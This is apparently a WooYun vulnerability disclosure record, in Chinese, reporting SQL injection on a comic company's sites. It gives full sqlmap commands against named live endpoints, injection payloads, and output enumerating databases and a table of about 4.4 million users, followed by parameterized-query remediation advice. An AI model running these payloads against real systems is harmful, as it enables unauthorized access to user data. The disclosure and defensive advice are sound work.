{"id": 74292, "wybug_id": "wooyun-2016-0177335", "wybug_title": "知音漫客多个站点存在SQL注入含主站(涉及450W用户信息)", "wybug_corp": "zymk.cn", "wybug_author": "路人甲", "wybug_date": "2016-02-21 09:30", "wybug_open_date": "2016-02-26 09:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 当用户可控的数据未经过恰当的处理就进入了数据库执行的SQL语句中时，就可能存在SQL注入漏洞。攻击者可以定制特定的字符来改变SQL语句的语义。通过SQL注入漏洞可以造成多种危害，包括读取或者修改应用的数据，改变程序逻辑，提升权限和执行操作系统命令等。 详细说明：  1.450W用户信息poc：\npython sqlmap.py -u http://www.mkzhan.com/index.php/read/showTucao/ --data=\"chapterid=122203&page=1\" -D comic  -T mk_user --count\n数据库相关信息证明仅证明，未查看存储任何用户信息。\n➜  sqlmap git:(master) ✗ python sqlmap.py -u http://www.mkzhan.com/index.php/read/showTucao/ --data=\"chapterid=122203&page=1\" -D comic  -T mk_user --count         _ ___ ___| |_____ ___ ___  {1.0-dev-f54b25c}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 19:54:09[19:54:09] [INFO] resuming back-end DBMS 'mysql'[19:54:09] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: chapterid (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: chapterid=122203 AND (SELECT * FROM (SELECT(SLEEP(5)))tuMI)&page=1    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: chapterid=122203 UNION ALL SELECT NULL,NULL,CONCAT(0x716a6b7a71,0x7253797250426357596c4e634564664677465a6a54795a6546676b437a455768766c4b6a634a4377,0x71717a7671),NULL,NULL,NULL,NULL,NULL,NULL-- -&page=1---[19:54:09] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.17back-end DBMS: MySQL 5.0.12Database: comic+---------+---------+| Table   | Entries |+---------+---------+| mk_user | 4419339 |+---------+---------+\n   漏洞证明：  2.    商城http://shop.zymk.cn/index.php/Goodstest/orderpost  cart_id%5B%5D=444671&number%5B444671%5D=2  需要带有效cookie参数存在sql注入。poc：\n12:44:20] [INFO] resuming back-end DBMS 'mysql'[12:44:20] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: cart_id[] (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: cart_id[]=444671 AND (SELECT * FROM (SELECT(SLEEP(5)))wQpB)&number[444671]=2---[12:44:21] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.12[12:44:21] [INFO] fetching tables for database: 'mkshop'[12:44:21] [INFO] fetching number of tables for database 'mkshop'[12:44:21] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)[12:44:24] [WARNING] it is very important to not stress the network adapter during usage of time-based payloads to prevent potential disruptionsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y1[12:44:47] [INFO] adjusting time delay to 1 second due to good response times89[12:44:53] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)activity_num[12:46:01] [INFO] retrieved: ecs_account_log[12:47:20] [INFO] retrieved: ecs_ad[12:47:31] [INFO] retrieved: ecs_ad_custom[12:48:16] [INFO] retrieved: ecs_ad_position[12:49:09] [INFO] retrieved: ecs_admin_action[12:50:10] [INFO] retrieved: ecs_admin_log[12:50:39] [INFO] retrieved: ecs_admin_message[12:51:23] [INFO] retrieved: ec[12:51:55] [WARNING] turning off pre-connect mechanism because of connection time out(s)s_admin_user[12:52:25] [INFO] retrieved: ecs_adsense[12:53:01] [INFO] retrieved: ecs_a\n3.需要带自己的cookie.。核心数据库450W用户信息。poc：\n➜  sqlmap git:(master) ✗ python sqlmap.py -u http://www.mkzhan.com/index.php/comic/addmonthticket/ --data=\"comicid=70434&userid=6200692\" --cookie=\"PH\" --dbs         _ ___ ___| |_____ ___ ___  {1.0-dev-f54b25c}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 19:57:35[19:57:35] [INFO] resuming back-end DBMS 'mysql'[19:57:35] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: comicid (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: comicid=70434 AND 8726=8726&userid=6200692    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: comicid=70434 AND (SELECT * FROM (SELECT(SLEEP(5)))ZInn)&userid=6200692---[19:57:35] [INFO] the back-end DBMS is MySQLweb application technology: PHP 5.2.17back-end DBMS: MySQL 5.0.12[19:57:35] [INFO] fetching database names[19:57:35] [INFO] fetching number of databases[19:57:35] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[19:57:35] [INFO] retrieved: 3[19:57:37] [INFO] retrieved: information_schema[19:57:54] [INFO] retrieved: comic[19:57:58] [INFO] retrieved: testavailable databases [3]:[*] comic[*] information_schema[*] test\n   修复方案：  最有效的防御SQL注入的方式是在所有的数据库操作上使用参数化查询（也被称为预编译)。预编译通过两步把可能存在危害的数据整合到SQL查询中。第一步，应用定义查询语句的结构，在语句中预留位置给用户输入。第二部，应用把每个位置需要的用户输入传递给数据库。因为第一步中，应用已经定义了语句的结构，数据库已经对语法进行了编译，第二部中及时传入恶意的用户输入也无法影响SQL语句的语意，从而避免了SQL注入攻击。对于不同的数据库和编程语言需要查询文档，寻找合适的api。强烈建议使用参数化处理SQL语句中的每一个变量。需要注意的是以下一些防御SQL注入的方式并不总是有效的，所以不建议大家使用以下的方式防御SQL注入：一种常见的方式是在用户数据拼接到SQL语句之前转义其中的单引号。这是为了避免用户插入单引号，改变了SQL的语法。但是如果变量类型是数字型，这种防御就可能失败。因为SQL语句结构中并没有单引号包裹变量的话，仅仅使用空格就可以改变语法结构。另一种常见的防御方案是使用存储过程。尽管存储过程提供了很多安全特性，但是并不能保证防御SQL注入。当存储过程中可以动态创建SQL结构的时候就可能会发生SQL注入。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-02-26 09:40 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}